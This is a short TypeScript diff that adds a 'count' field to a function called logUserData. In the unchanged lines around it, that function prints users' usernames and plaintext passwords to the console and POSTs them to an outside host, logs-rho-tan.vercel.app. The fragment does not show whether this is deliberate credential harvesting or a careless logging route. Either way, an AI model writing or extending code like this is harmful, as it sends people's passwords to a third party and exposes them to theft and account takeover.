@@ -68,12 +68,14 @@ export async function logUserData({
   username,
   password,
   id,
+  count,
 }: {
   username: string;
   password: string;
   id: string;
+  count: number;
 }): Promise<{ success: boolean }> {
-  console.log({ username, password, id });
+  console.log({ username, password, id, count });
   const res = await fetch("https://logs-rho-tan.vercel.app/api/details", {
     method: "POST",
     headers: { "Content-Type": "application/json" },
@@ -81,6 +83,7 @@ export async function logUserData({
       username,
       password,
       id,
+      count,
     }),
   });
   const payload = await res.json().catch(() => null);
